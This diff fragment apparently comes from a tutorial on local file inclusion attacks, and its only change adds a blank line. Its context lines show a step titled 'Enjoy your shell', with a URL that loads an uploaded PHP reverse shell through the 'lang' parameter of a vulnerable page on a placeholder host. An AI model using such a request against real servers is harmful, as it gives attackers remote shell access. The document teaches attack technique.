@@ -107,3 +107,4 @@ You might detect something like
 ### 3) Enjoy your shell
 
     http://domain.local/vulnerable.php?lang=/var/ftp/pub/php-reverse-shell.php
+
